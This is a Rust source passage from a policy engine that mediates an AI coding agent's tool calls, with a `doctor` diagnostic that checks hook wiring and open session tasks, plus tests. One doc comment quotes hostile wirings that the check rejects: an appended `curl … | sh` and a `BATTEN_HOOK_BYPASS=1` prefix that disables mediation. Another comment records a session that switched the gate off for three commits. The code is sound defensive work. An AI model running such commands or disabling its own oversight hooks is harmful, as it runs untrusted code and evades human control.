    pub harnesses: Vec<HarnessWiring>,
    /// How many non-batten registrations the AT-LOAD record accounts for, or
    /// `None` when there is no record (CLOUD-893).
    ///
    /// **The one number the live counts structurally cannot carry.** Every
    /// `merged_*` field above describes the DISK, and a harness reads its wiring
    /// once, at session start — so after `batten wiring reclaim` the disk says
    /// zero while the running host is still dispatching what was there. This
    /// field is what makes those two states distinguishable instead of
    /// byte-identical, and it is the whole reason the repair is allowed to exist:
    /// without it, repairing manufactures a green over a runtime nobody looked
    /// at.
    ///
    /// **Reported, never judged.** Whether a session still running the old wiring
    /// is acceptable is a consumer's call, exactly as whether a sibling is
    /// legitimate is (non-negotiable rule 1), and this repository answers it in
    /// `hooks-wiring-check` rather than here. So a non-zero record does not move
    /// `ok`: the engine supplies the arithmetic and the consumer's gate supplies
    /// the verdict.
    ///
    /// `None` rather than `0` because "no repair has been recorded" and "a repair
    /// found nothing" are different states with different remedies — the first
    /// says read the disk, the second says restart. Collapsing them would
    /// reproduce, in the field added to prevent it, the collapse
    /// `merged_surfaces_read` was added to prevent.
    pub at_load_siblings: Option<usize>,
}

impl WiringReport {
    /// The exit code this report maps to.
    ///
    /// [`ExitCode::Violation`] is unreachable here for the reason it is
    /// unreachable for [`Report`]: a sub-verb of `doctor` is a diagnosis, and a
    /// mediating harness reads `2` as a deny. "Your wiring is wrong" is not
    /// "policy says no".
    #[must_use]
    pub fn code(&self) -> ExitCode {
        if self.ok {
            ExitCode::Success
        } else {
            ExitCode::Usage
        }
    }
}

/// A derived event has no registration at all — a surface the decision says must
/// be covered and is not.
const EVENT_UNREGISTERED: &str = "hook-wiring-event-unregistered";
/// A derived event carries more than one batten registration.
///
/// The `n` is a literal token rather than the count. A reason id is
/// `&'static str` and must be byte-stable across runs and machines (§6); the
/// count is in `registrations` for a reader who wants it.
const EVENT_REGISTERED_N_TIMES: &str = "hook-wiring-event-registered-n-times";
/// A batten registration sits under an event the derivation does not emit — a
/// hook that can never fire: installed, green to every other check, enforcing
/// nothing.
const EVENT_UNDERIVED: &str = "hook-wiring-event-underived";
/// A batten registration carries a matcher.
///
/// Not "a matcher we disagree with" — any at all. The derivation emits none
/// deliberately, so that `batten.toml`'s `mediated_call` rows are the only
/// narrowing; a matcher here narrows in a second place, and a wrong one narrows
/// enforcement silently.
const MATCHER_NARROWS: &str = "hook-wiring-matcher-narrows";
/// A registration claims to be batten's and does not invoke the engine.
const COMMAND_DRIFT: &str = "hook-wiring-command-drift";
/// The harness declares a wiring file and the checkout has none.
const FILE_MISSING: &str = "hook-wiring-file-missing";
/// A batten registration sits on a MERGED surface as well as the committed one
/// (CLOUD-525).
///
/// A second authority for one decision, arriving from a file the repository does
/// not own — so it cannot be fixed by editing the committed wiring, which is
/// exactly why it needs its own id rather than folding into
/// `event-registered-n-times`.
const MERGED_REGISTRATION: &str = "hook-wiring-merged-registration";
/// A command that is not batten's is registered on a surface the consumer
/// declared exclusively batten's (CLOUD-893).
///
/// **Fires only under `[hook] exclusive`, and the gating is the point.** The
/// engine cannot decide whether a hook beside batten's is legitimate — that is a
/// consumer's judgement, and minting the verdict here would put it in
/// `crates/batten` for every adopter. Under a declaration it is no longer a
/// judgement but an invariant somebody wrote down, and enforcing it is what the
/// engine is for.
///
/// Pointer-only, exactly as its neighbours are: the harness and the event, never
/// the command. A sibling's command line carries a path (rule 4), and the count
/// in [`HarnessWiring::siblings`] is still the only quantity reported. Which
/// command it was is answerable from the file the finding names the event in;
/// the diagnosis does not have to carry it to be actionable.
const SIBLING_REGISTERED: &str = "hook-wiring-sibling-registered";
/// The same, on a surface the host MERGES rather than the committed one.
///
/// Its own id because the remedy differs and the committed one's does not reach
/// it: a merged surface is under `$HOME`, so editing the REPOSITORY cannot
/// remove the registration — the same reason [`MERGED_REGISTRATION`] is separate
/// from [`EVENT_REGISTERED_N_TIMES`].
///
/// **That is a statement about editing tracked files, not about this
/// repository's reach, and it was read as the latter** (CLOUD-1339).
/// `batten wiring reclaim` removes a merged registration, and
/// `crates/batten/tests/it/wiring_reclaim.rs` drives it against a real `$HOME` —
/// so the remedy exists and ships here. Measured 2026-09-02, a session read this
/// comment beside the refusal, concluded the condition was unfixable from the
/// repository, switched the gate off for three commits and wrote that conclusion
/// into two commit messages. The verb is a REPAIR rather than a fix — a launcher
/// that registers at session start registers again next session — but a repair
/// is not nothing, and it is what the `hook wire duplicate` verdict now routes
/// to first.
const MERGED_SIBLING: &str = "hook-wiring-merged-sibling";
/// The wiring file is there and is not readable as the JSON object it must be.
///
/// Distinct from missing on purpose: two different remedies — write one, or fix
/// one — so a single reason id would send the reader to the wrong place.
const FILE_UNREADABLE: &str = "hook-wiring-file-unreadable";

// `committed_events`, `entries_under` and `same_file` used to live here. They
// moved to [`crate::wiring`] when the repair path landed (CLOUD-893), because a
// reader and a writer that disagree about what a registration IS is the one
// defect `merged_under` below already warns about — "a sibling count that
// disagreed with the committed one about what a sibling is could not be summed
// with it." One authority, imported by both.

/// Diagnose one harness's committed wiring against what the binary derives.
///
/// **Selected broadly, judged narrowly**, which is a false green this predicate's
/// bash predecessor had while it was being written. Selecting batten's entries on
/// "does this command reach the engine" makes the selector and the check one
/// predicate: a renamed command stops being *wrong* and becomes *invisible*, and
/// the run reports zero registrations and passes. So the selector asks only
/// whether a command mentions batten at all, and whether it actually reaches the
/// engine is decided below, where a wrong answer is a finding rather than a
/// silence.
#[allow(
    clippy::too_many_lines,
    reason = "one harness's diagnosis reads as one sequence: locate the file, judge               batten's entries per derived event, then the rest of the surface. Splitting               it would thread `findings`, `registrations` and `siblings` through helpers               that exist only to satisfy a line count, and each of the three phases is               already commented as its own step."
)]
fn diagnose_harness(dir: &Path, harness: hook::Harness, exclusive: bool) -> Option<HarnessWiring> {
    let wiring = harness.wiring()?;
    let path = match wiring.file {
        hook::WiringFile::Key { path, .. } | hook::WiringFile::Whole(path) => path,
    };
    let derived = wiring.registrations(harness);
    let command = hook::wiring_command(harness);
    let mut findings = Vec::new();
    let mut registrations = 0;
    let mut siblings = 0;

    // THE MERGED SURFACES ARE STILL INSPECTED ON THE EARLY-RETURN PATHS, and that
    // is the whole reason this closure calls `diagnose_merged` rather than filling
    // zeroes (caught in review of #714).
    //
    // Both early returns below are about the COMMITTED file — it is missing, or it
    // will not parse. Neither says anything about the surfaces the host MERGES: a
    // repository with no `settings.json` at all can still be running two launcher
    // hooks out of `$HOME`, which is exactly the state CLOUD-525 measured and this
    // census exists to see. Zeroing the five dispositions there would report a
    // clean merged surface over one nobody looked at — a sixth disposition no
    // counter names, which is the collapse the split counters were added to
    // remove one level down. It would also break `MergedTally::partitions`: the
    // five must sum to `merge_surfaces().len()`, and five zeroes do not.
    let row = |mut findings: Vec<WiringFinding>, registrations, siblings| {
        let merged = diagnose_merged(dir, harness, &command, exclusive);
        findings.extend(merged.findings);
        HarnessWiring {
            harness: harness.as_str(),
            registrations,
            siblings,
            merged: merged.commands,
            merged_siblings: merged.siblings,
            merged_surfaces_read: merged.read,
            merged_surfaces_absent: merged.absent,
            merged_surfaces_unreadable: merged.unreadable,
            merged_surfaces_deduplicated: merged.deduplicated,
            merged_surfaces_unresolvable: merged.unresolvable,
            ok: findings.is_empty(),
            findings,
        }
    };

    // ABSENT IS A FINDING, NEVER A PASS. A harness that declares a surface and
    // has no file on it is unwired, which is the state this check exists to
    // report — reading "nothing to compare" as "nothing wrong" is the shape the
    // gate keeps re-meeting.
    let Ok(raw) = std::fs::read_to_string(dir.join(path)) else {
        return Some(row(
            vec![WiringFinding {
                event: String::new(),
                reason: FILE_MISSING,
            }],
            0,
            0,
        ));
    };
    let unreadable = || {
        Some(row(
            vec![WiringFinding {
                event: String::new(),
                reason: FILE_UNREADABLE,
            }],
            0,
            0,
        ))
    };
    let Ok(document) = serde_json::from_str::<serde_json::Value>(&raw) else {
        return unreadable();
    };
    let Some(events) = committed_events(&document, wiring.file) else {
        return unreadable();
    };

    // Batten's own entries, judged per derived event.
    for (event, spelling) in &derived {
        let _ = event;
        let mut here = 0;
        for (matcher, entry) in events
            .get(*spelling)
            .map(entries_under)
            .unwrap_or_default()
            .into_iter()
            .filter(|(_, entry)| entry.contains("batten"))
        {
            here += 1;
            registrations += 1;
            if matcher.is_some() {
                findings.push(WiringFinding {
                    event: (*spelling).to_owned(),
                    reason: MATCHER_NARROWS,
                });
            }
            // STRUCTURAL, not a substring: `reaches_engine` states why, and the
            // three spellings a `contains` call reports clean.
            if !reaches_engine(entry, harness) {
                findings.push(WiringFinding {
                    event: (*spelling).to_owned(),
                    reason: COMMAND_DRIFT,
                });
            }
        }
        // EXACTLY ONE, IN BOTH DIRECTIONS. The engine emits one registration per
        // event, so a second is a second authority for one decision, and a zero
        // is a surface the decision says must be covered and is not.
        if here == 0 {
            findings.push(WiringFinding {
                event: (*spelling).to_owned(),
                reason: EVENT_UNREGISTERED,
            });
        } else if here > 1 {
            findings.push(WiringFinding {
                event: (*spelling).to_owned(),
                reason: EVENT_REGISTERED_N_TIMES,
            });
        }
    }

    // Everything else on the surface: a batten entry under an event the
    // derivation does not emit, and the sibling count.
    let spellings: Vec<&str> = derived.iter().map(|(_, spelling)| *spelling).collect();
    for (event, value) in events.iter() {
        for (_, entry) in entries_under(value) {
            if !entry.contains("batten") {
                siblings += 1;
                // COUNTED ALWAYS, REFUSED ONLY UNDER THE DECLARATION. The count
                // is the engine's to report and the verdict is the consumer's to
                // declare; `HookConfig::exclusive` is where that declaration
                // lives and why this is an invariant rather than a judgement.
                if exclusive {
                    findings.push(WiringFinding {
                        event: event.clone(),
                        reason: SIBLING_REGISTERED,
                    });
                }
            } else if !spellings.contains(&event.as_str()) {
                registrations += 1;
                findings.push(WiringFinding {
                    event: event.clone(),
                    reason: EVENT_UNDERIVED,
                });
            }
        }
    }

    // The MERGED surfaces (CLOUD-525). Read after the committed one and folded
    // into the same row, because "what does this host run" is one question — the
    // committed file is a partial answer to it, not a different question.
    //
    // Absent is the ordinary case and never a finding: most machines carry no
    // launcher file, and a check that went red for its absence would be red on
    // every developer's box for a state nobody can fix.
    let merged = diagnose_merged(dir, harness, &command, exclusive);
    findings.extend(merged.findings);

    Some(HarnessWiring {
        harness: harness.as_str(),
        registrations,
        siblings,
        merged: merged.commands,
        merged_siblings: merged.siblings,
        merged_surfaces_read: merged.read,
        merged_surfaces_absent: merged.absent,
        merged_surfaces_unreadable: merged.unreadable,
        merged_surfaces_deduplicated: merged.deduplicated,
        merged_surfaces_unresolvable: merged.unresolvable,
        ok: findings.is_empty(),
        findings,
    })
}

/// Whether a committed entry actually invokes the engine, structurally.
///
/// **This replaced `entry.contains(&command)`, and the substring was three holes
/// rather than a looseness worth keeping.** Its stated reason was right and is
/// preserved: *"a consumer may name an absolute path to the binary, and the claim
/// being checked is that the engine is reached, not how the operator spelled the
/// way there."* What it could not distinguish is a command that reaches the
/// engine from one that reaches the engine **and something else**, or one that
/// reaches an engine told not to mediate:
///
/// * `batten hook --harness claude-code; curl … | sh` — a superstring, and clean
///   under `contains`. The appended program runs on every mediated call.
/// * `BATTEN_HOOK_BYPASS=1 batten hook --harness claude-code` — a registration
///   that mediates **nothing**, and the most convincing-looking wiring in the
///   file.
/// * a pipeline or redirect around the invocation, which discards the very exit
///   status the mediation IS. That is `verdict-not-discarded`'s predicate, and
///   this is the one command line where it decides whether policy runs at all.
///
/// **Full argv equality is the wrong repair**, which is why this is three clauses
/// and not one comparison: it rejects `mise exec -- batten hook --harness x`, a
/// wrapper script, and every flag the derivation might grow — catching the
/// malicious spellings and breaking the honest ones.
///
/// Clause (a) matches on the token's file **stem**, so an absolute path and a
/// `.exe` both pass while `batten-hook.sh` stays drift for a consumer's launcher
/// column to answer for.
fn reaches_engine(entry: &str, harness: hook::Harness) -> bool {
    // (b) No shell control operator anywhere in the entry. Checked over
    // characters rather than the two-character operators, so `&&` and `||` are
    // covered by `&` and `|`.
    if entry.contains([';', '|', '&', '\n', '\r', '<', '>']) {
        return false;
    }
    let tokens: Vec<&str> = entry.split_whitespace().collect();
    // (c) No `BATTEN_` environment assignment prefixed onto the invocation. A
    // bypass spelled here suppresses mediation for every call the host makes,
    // and every other check in this function would still pass.
    if tokens
        .iter()
        .any(|token| token.starts_with("BATTEN_") && token.contains('='))
    {
        return false;
    }
    // (a) The derived argv appears as a contiguous run immediately after a token
    // whose file stem is the binary's name.
    //
    // DERIVED FROM THE `SURFACE` ROW, NOT SPELLED HERE (CLOUD-1191). This read
    // `["hook", "--harness", harness.as_str()]` — a literal independent of the
    // declaration — so it answered "does the wiring name THIS STRING" where the
    // question is "does the wiring name the declared mediation path". Those
    // differ exactly when it matters: against a settings file naming a command
    // the surface no longer declares, the literal version returns `true` and
    // reports stale wiring as healthy. The one diagnostic built for that failure
    // was blind to it.
    //
    // No mediation row means no declared path for a registration to reach, so
    // nothing reaches the engine. That is `false` — loud — rather than a literal
    // fallback, which would be the spelling this change removes.
    let Some(mut derived) = crate::surface::mediation_argv() else {
        return false;
    };
    derived.push(harness.as_str().to_owned());
    tokens.iter().enumerate().any(|(at, token)| {
        Path::new(token)
            .file_stem()
            .is_some_and(|stem| stem == crate::surface::BINARY)
            && tokens.len() >= at + 1 + derived.len()
            && tokens[at + 1..=at + derived.len()] == derived
    })
}

/// What one host's merged surfaces amount to, as a partition rather than a pair.
///
/// Every surface [`hook::Harness::merge_surfaces`] declares lands in exactly one
/// disposition, which is what makes [`MergedTally::partitions`] an invariant
/// rather than a hope. The pair this replaced could not do that: four different
/// answers all rendered as `read: 0`.
#[derive(Debug, Default, Clone, PartialEq, Eq)]
struct MergedTally {
    /// Every command found on a surface that was read, batten's and siblings'.
    commands: usize,
    /// Of those, the ones that are not batten's.
    siblings: usize,
    read: usize,
    absent: usize,
    unreadable: usize,
    deduplicated: usize,
    unresolvable: usize,
    findings: Vec<WiringFinding>,
}

impl MergedTally {
    /// Whether every declared surface was accounted for exactly once.
    ///
    /// The one property that keeps the five dispositions honest: a surface that
    /// falls through every arm would silently vanish, which is the same
    /// disappearance the single `read` counter used to perform. Asserted in the
    /// suite rather than trusted, because the arms are `continue`s and a sixth
    /// one is exactly the edit that would not look wrong.
    ///
    /// Test-only: the invariant is asserted rather than branched on, because a
    /// production reader that *acted* on a failed partition would be choosing
    /// between two answers it cannot tell apart. The right place to notice is the
    /// suite.
    #[cfg(test)]
    const fn partitions(&self, declared: usize) -> bool {
        self.read + self.absent + self.unreadable + self.deduplicated + self.unresolvable
            == declared
    }
}

/// Count what this host merges beyond its committed wiring (CLOUD-525).
///
/// **No path leaves this function**, on either channel: the home directory it
/// resolves differs per machine, and a reason id carrying one would defeat both
/// §6 byte-stability and rule 4. `a_wiring_reason_id_never_carries_a_path` is the
/// assertion.
///
/// A batten registration found here IS a finding — a second authority for a
/// decision the committed file already makes, arriving from a file the
/// repository cannot edit. A non-batten one is only counted, and now counted
/// SEPARATELY: whether a sibling is legitimate is a consumer's judgement, and
/// this repository answers it in `hooks-wiring-check` rather than in the engine
/// (non-negotiable rule 1) — but it cannot answer it at all from a number that
/// fuses siblings with batten's own entries.
fn diagnose_merged(
    dir: &Path,
    harness: hook::Harness,
    command: &str,
    exclusive: bool,
) -> MergedTally {
    use etcetera::BaseStrategy as _;

    let declared = harness.merge_surfaces().len();
    if declared == 0 {
        return MergedTally::default();
    }
    let Ok(strategy) = etcetera::choose_base_strategy() else {
        // No resolvable home is COULD NOT LOOK, and it says so in its own
        // counter rather than as a zero in `read` — which is where three other
        // answers used to arrive looking identical.
        return MergedTally {
            unresolvable: declared,
            ..MergedTally::default()
        };
    };
    merged_under(strategy.home_dir(), dir, harness, command, exclusive)
}

/// The counting half of [`diagnose_merged`], with the home directory passed in.
///
/// Split for one reason: the home directory is the only input this predicate
/// cannot be handed, and a counter whose off-by-one nobody can reach from a test
/// is a counter nobody is holding. `a_surface_is_counted_read_only_once_its_shape_is_a_wiring_file`
/// drives this seam.
fn merged_under(
    home: &Path,
    dir: &Path,
    harness: hook::Harness,
    command: &str,
    exclusive: bool,
) -> MergedTally {
    let surfaces = harness.merge_surfaces();
    let mut tally = MergedTally::default();
    for surface in surfaces {
        let path = home.join(surface);
        // THE SAME FILE IS NOT A SECOND AUTHORITY. Several hosts spell their
        // user-level surface and their project-level one identically, differing
        // only in the directory each is resolved against, so a checkout sitting
        // AT the home directory resolves both to one file. Counting it twice
        // would report every one of batten's own registrations as a merged
        // second authority — a finding about the reader rather than the wiring.
        //
        // COUNTED rather than skipped. This arm was a bare `continue`, so a
        // deduplicated surface rendered as `read: 0` — byte-identical to one
        // that is absent, and to one that is unreadable, and to a host with no
        // resolvable home. Four answers, one number.
        if same_file(&path, &dir.join(surface)) {
            tally.deduplicated += 1;
            continue;
        }
        let Ok(raw) = std::fs::read_to_string(&path) else {
            // ABSENT AND UNREADABLE ARE DIFFERENT REMEDIES, so they are
            // different counters, exactly as `FILE_MISSING` and
            // `FILE_UNREADABLE` are different reason ids on the committed side.
            // A read that fails over a path that exists is a permission or an
            // IO fault, not an absence.
            if path.exists() {
                tally.unreadable += 1;
            } else {
                tally.absent += 1;
            }
            continue;
        };
        let Ok(document) = serde_json::from_str::<serde_json::Value>(&raw) else {
            tally.unreadable += 1;
            continue;
        };
        // Every host that merges keys its hooks under the same word its
        // committed file does, which `WiringFile` already states.
        let Some(events) = committed_events(
            &document,
            harness
                .wiring()
                .map_or(hook::WiringFile::Whole(""), |w| w.file),
        ) else {
            tally.unreadable += 1;
            continue;
        };
        // Counted AFTER the shape is validated, not after the parse. A document
        // that is JSON and is not a wiring file — `{"hooks": []}`, an array where
        // the map belongs — would otherwise report `merged_surfaces_read: 1` with
        // `merged: 0`, which is byte-identical to a valid file declaring no
        // hooks. That collapse is the exact one this field exists to prevent:
        // "looked and found none" and "could not look" have to stay apart, and a
        // counter incremented one step too early makes them the same number.
        tally.read += 1;
        for (event, value) in events.iter() {
            for (_, entry) in entries_under(value) {
                tally.commands += 1;
                if entry.contains(command) || entry.contains("batten") {
                    tally.findings.push(WiringFinding {
                        event: event.clone(),
                        reason: MERGED_REGISTRATION,
                    });
                } else {
                    // THE SAME SELECTOR THE COMMITTED SIDE USES, deliberately:
                    // "mentions batten at all" is what makes a renamed command
                    // wrong rather than invisible, and a sibling count that
                    // disagreed with the committed one about what a sibling IS
                    // could not be summed with it.
                    tally.siblings += 1;
                    if exclusive {
                        tally.findings.push(WiringFinding {
                            event: event.clone(),
                            reason: MERGED_SIBLING,
                        });
                    }
                }
            }
        }
    }
    tally
}

/// Diagnose the hook wiring of every harness the core knows (CLOUD-777).
///
/// **Ranged over [`hook::Harness::ALL`], never a table.** Which harnesses exist
/// is the core's own answer, so a seventh adapter is diagnosed the day it lands
/// rather than silently omitted — the shape a hand-kept list answers "no" to.
/// `exit-code` declares no wiring surface and [`hook::Harness::wiring`] returns
/// `None` for it, which is what excludes it: the neutral contract is an envelope
/// in and a decision as an exit status out, with no file to register in.
///
/// **The exclusivity declaration is read here and FAILS OPEN.** A config that
/// does not load, or loads and declares nothing, leaves `exclusive` false — so a
/// checkout whose `batten.toml` is missing or broken gets the pre-CLOUD-893
/// behaviour rather than a refusal it cannot act on. Reading "could not look" as
/// "the consumer declared exclusivity" would mint the verdict this flag exists
/// to keep out of the engine, and it would do it exactly where the evidence is
/// weakest. The `config` check in bare [`diagnose`] is what reports an
/// unloadable config; this verb does not re-report it.
#[must_use]
pub fn diagnose_hooks(dir: &Path) -> WiringReport {
    let exclusive = resolve::resolve(dir, &crate::Overrides::default())
        .ok()
        .and_then(|resolved| resolved.hook.as_ref().map(|hook| hook.exclusive))
        .unwrap_or(false);
    let harnesses: Vec<HarnessWiring> = hook::Harness::ALL
        .iter()
        .filter_map(|harness| diagnose_harness(dir, *harness, exclusive))
        .collect();
    WiringReport {
        version: config::VERSION,
        ok: harnesses.iter().all(|harness| harness.ok),
        harnesses,
        // Fails open to `None`, which is the read-the-disk arm: a store that
        // cannot be reached has told us nothing about a repair, and inventing a
        // zero here would be the false green the field exists to refuse.
        at_load_siblings: wiring::read_at_load(dir)
            .ok()
            .flatten()
            .map(|record| record.siblings()),
    }
}

/// One session's own declared-open work, as `doctor session` renders it.
///
/// `#[non_exhaustive]` for [`WiringReport`]'s reason.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
#[non_exhaustive]
pub struct SessionReport {
    /// The running binary's version.
    pub version: &'static str,
    /// How many declared tasks are not `completed`, or `None` for
    /// could-not-look.
    ///
    /// **THREE-VALUED, AND THAT IS THE WHOLE ROW** (CLOUD-1376). An unreadable
    /// store, an undeclared template and a store with nothing open are three
    /// different answers, and collapsing the first into the third is exactly the
    /// false clean this verb exists to refuse: "no store" must never read as
    /// "nothing left to do".
    pub open: Option<usize>,
    /// How many tasks the store holds at all, or `None` for could-not-look.
    pub total: Option<usize>,
    /// The ids of the open tasks, sorted — a POINTER set, never a subject line.
    ///
    /// Non-negotiable rule 4: an id sends a reader to the task; a subject would
    /// return the session's own prose to it, which is the mirror a restatement
    /// can clear.
    pub ids: Vec<String>,
    /// Whether the session has nothing open. False for could-not-look.
    pub ok: bool,
}

/// Read the live session's task store and count what is not finished.
///
/// # Why this is a verb and not only a nudge
///
/// The question *is this session safe to end* arrives INSIDE a turn, and a
/// `Stop` rule answers after one. A verb is what lets the question be answered
/// by an exit code rather than by an opinion — which is the whole defect
/// CLOUD-1376 records, where the store held `pending` and the answer given was
/// "safe".
#[must_use]
pub fn diagnose_session(dir: &Path) -> SessionReport {
    let unreadable = SessionReport {
        version: config::VERSION,
        open: None,
        total: None,
        ids: Vec::new(),
        ok: false,
    };
    let Some(link) = resolve::resolve(dir, &crate::Overrides::default())
        .ok()
        .and_then(|resolved| {
            let transcript = resolved.transcript.as_ref()?;
            // The template's ABSENCE is could-not-look rather than clean: a
            // consumer that never declared a store has not told us it has no
            // work.
            transcript.tasks.as_ref()?;
            crate::transcript::tasks_link(dir, transcript.path.as_deref()?)
        })
    else {
        return unreadable;
    };
    let Ok(entries) = std::fs::read_dir(&link) else {
        return unreadable;
    };
    let mut total = 0usize;
    let mut ids = Vec::new();
    for entry in entries.flatten() {
        let path = entry.path();
        if path.extension().is_none_or(|ext| ext != "json") {
            continue;
        }
        let Ok(bytes) = std::fs::read_to_string(&path) else {
            // ONE unreadable member poisons the whole reading. A partial count
            // is a number that looks measured and is not, and this verb's only
            // failure mode that matters is under-reporting.
            return unreadable;
        };
        let Ok(task) = serde_json::from_str::<serde_json::Value>(&bytes) else {
            return unreadable;
        };
        total += 1;
        if task.get("status").and_then(serde_json::Value::as_str) != Some("completed")
            && let Some(id) = task.get("id").and_then(serde_json::Value::as_str)
        {
            ids.push(id.to_owned());
        }
    }
    // Byte-stable output (§6): directory order is the filesystem's, and a report
    // whose id list reorders between runs is not byte-stable.
    ids.sort_by(|left, right| {
        let numeric = left
            .parse::<u64>()
            .ok()
            .zip(right.parse::<u64>().ok())
            .map(|(left, right)| left.cmp(&right));
        numeric.unwrap_or_else(|| left.cmp(right))
    });
    SessionReport {
        version: config::VERSION,
        open: Some(ids.len()),
        total: Some(total),
        ok: ids.is_empty(),
        ids,
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used)]
mod tests {
    use std::fs;

    use super::*;

    fn scratch(name: &str) -> std::path::PathBuf {
        let dir = std::env::temp_dir().join("batten-doctor-tests").join(name);
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        dir
    }

    /// `reaches_engine` answers about the DECLARED mediation path, not a
    /// literal — so wiring naming a command the surface no longer declares is
    /// drift rather than health (CLOUD-1191).
    ///
    /// **The second assertion is the whole row.** Before the derivation, the
    /// check matched the literal `"hook"`, so a settings file naming a renamed
    /// or removed verb still returned `true`: the one diagnostic built for this
    /// failure reported it healthy, while the invocation itself became an
    /// unknown subcommand — clap error, exit `1`, which every host reads as
    /// allow. Fail-open, reported green.
    ///
    /// Fails by: reverting `reaches_engine` to a literal argv.
    #[test]
    fn wiring_naming_an_undeclared_path_does_not_reach_the_engine() {
        let harness = hook::Harness::ClaudeCode;
        let live = hook::wiring_command(harness);
        assert!(
            reaches_engine(&live, harness),
            "the command this build emits must reach the engine: {live}"
        );

        // The same shape with a verb the surface does not declare. This is what a
        // half-done rename leaves in a committed wiring file. `adjudicate` is the
        // path CLOUD-1192 proposes, so this is the exact string that row's
        // rename would strand if it landed without this derivation.
        let stale = format!(
            "{} adjudicate --harness {}",
            crate::surface::BINARY,
            harness.as_str()
        );
        assert!(
            !reaches_engine(&stale, harness),
            "wiring naming an undeclared verb must read as drift, not health: {stale}"
        );
    }

    #[test]
    fn a_missing_config_is_named_rather_than_lumped_in() {
        let dir = scratch("missing-config");
        let report = diagnose(&dir);
        let config = report.checks.iter().find(|c| c.name == CONFIG).unwrap();
        assert!(!config.ok);
        assert_eq!(config.reason, Some("config-missing"));
    }

    #[test]
    fn an_invalid_config_is_named_distinctly_from_a_missing_one() {
        // Two different remedies — write one, or fix one — so one reason id for
        // both would send the reader to the wrong place.
        let dir = scratch("invalid-config");
        fs::write(dir.join("batten.toml"), "this is not toml\n").unwrap();
        let report = diagnose(&dir);
        let config = report.checks.iter().find(|c| c.name == CONFIG).unwrap();
        assert_eq!(config.reason, Some("config-invalid"));
    }

    #[test]
    fn a_failing_diagnosis_is_never_a_policy_verdict() {
        // The load-bearing guarantee: a harness reads `2` as deny, and "your
        // checkout is misconfigured" must never say that.
        let dir = scratch("never-a-verdict");
        let report = diagnose(&dir);
        assert!(!report.ok);
        assert_ne!(report.code(), ExitCode::Violation);
        assert_eq!(report.code(), ExitCode::Usage);
    }

    #[test]
    fn every_check_is_reported_not_just_the_first_failure() {
        // A diagnostic that stops at the first problem reports one symptom when
        // the operator wants the list.
        let dir = scratch("all-checks");
        let report = diagnose(&dir);
        // Asserted on the named checks rather than a count, so adding a
        // diagnostic does not turn this into a bookkeeping edit — what matters
        // is that a later check still runs after an earlier one failed.
        let failed: Vec<&str> = report
            .checks
            .iter()
            .filter(|check| !check.ok)
            .map(|check| check.name)
            .collect();
        assert_eq!(failed, vec![CONFIG, GIT_REPO]);
    }

    #[test]
    fn a_reason_id_never_carries_a_path() {
        // Rule 4 and §6 together: a message would embed an absolute path, which
        // differs per machine and leaks disk layout into a log.
        let dir = scratch("no-paths");
        for check in diagnose(&dir).checks {
            let Some(reason) = check.reason else { continue };
            assert!(!reason.contains('/'), "{reason} looks like a path");
        }
    }

    // --- `doctor hooks` (CLOUD-777) ------------------------------------------
    //
    // Shown able to fail (CLOUD-418): a matcher, a second command on one event,
    // and a missing event each turn the check red with their OWN reason id. A
    // fixture wiring is written into a scratch directory and diagnosed there, so
    // each case states its whole world rather than depending on the checkout.

    /// Claude Code's eight events, each carrying the derived command once.
    fn complete_wiring() -> serde_json::Value {
        let command = hook::wiring_command(hook::Harness::ClaudeCode);
        let mut events = serde_json::Map::new();
        for spelling in claude_spellings() {
            events.insert(
                spelling,
                serde_json::json!([{ "hooks": [{ "type": "command", "command": command }] }]),
            );
        }
        serde_json::json!({ "hooks": events })
    }

    /// The events the derivation registers for Claude Code, in its order.
    fn claude_spellings() -> Vec<String> {
        let wiring = hook::Harness::ClaudeCode
            .wiring()
            .expect("claude-code declares a wiring surface");
        wiring
            .registrations(hook::Harness::ClaudeCode)
            .into_iter()
            .map(|(_, spelling)| spelling.to_owned())
            .collect()
    }

    /// Where a harness reads its wiring, taken from its own declaration.
    ///
    /// **Not typed here**, for two reasons that point the same way. A consumer's
    /// artifact name in `crates/batten` is what non-negotiable rule 1 forbids and
    /// `document_facts::no_artifact_name_reaches_the_core` computes — a hook
    /// config path is the HOST's vocabulary rather than a consumer's, which is
    /// why `hook.rs` carries it, but a copy over here would be a second place it
    /// lives. And a fixture that hardcoded the path would keep passing if
    /// `Harness::wiring` moved, testing a file the binary no longer reads.
    fn surface_of(harness: hook::Harness) -> &'static str {
        match harness
            .wiring()
            .expect("the harness declares a surface")
            .file
        {
            hook::WiringFile::Key { path, .. } | hook::WiringFile::Whole(path) => path,
        }
    }

    /// Write `wiring` where Claude Code's surface lives, and diagnose that row.
    fn claude_row(name: &str, wiring: &serde_json::Value) -> HarnessWiring {
        let dir = write_surface(
            name,
            hook::Harness::ClaudeCode,
            &serde_json::to_string_pretty(wiring).unwrap(),
        );
        diagnose_hooks(&dir)
            .harnesses
            .into_iter()
            .find(|harness| harness.harness == "claude-code")
            .expect("claude-code is diagnosed")
    }

    /// A scratch directory carrying `body` at `harness`'s declared surface.
    fn write_surface(name: &str, harness: hook::Harness, body: &str) -> std::path::PathBuf {
        let dir = scratch(name);
        let path = dir.join(surface_of(harness));
        if let Some(parent) = path.parent() {
            fs::create_dir_all(parent).unwrap();
        }
        fs::write(path, body).unwrap();
        dir
    }

    fn reasons(row: &HarnessWiring) -> Vec<&'static str> {
        row.findings.iter().map(|finding| finding.reason).collect()
    }

    #[test]
    fn a_complete_wiring_is_the_baseline_every_mutation_departs_from() {
        // The baseline's completeness is the point: under CLOUD-777 a partial
        // wiring is not a smaller green, it is red — so a case that passed over
        // one would prove nothing about the mutations below.
        let row = claude_row("hooks-complete", &complete_wiring());
        assert!(row.ok, "{:?}", row.findings);
        assert_eq!(row.registrations, claude_spellings().len());
        assert_eq!(row.siblings, 0);
    }

    #[test]
    fn a_matcher_on_battens_own_entry_is_a_second_narrowing() {
        // Not "a matcher we disagree with" — any at all. The host's
        // absent-matcher default is every tool, which is what lets
        // `batten.toml`'s `mediated_call` rows be the only narrowing.
        let mut wiring = complete_wiring();
        wiring["hooks"]["PreToolUse"][0]["matcher"] = serde_json::json!("Bash");
        let row = claude_row("hooks-matcher", &wiring);
        assert!(!row.ok);
        assert_eq!(reasons(&row), vec![MATCHER_NARROWS]);
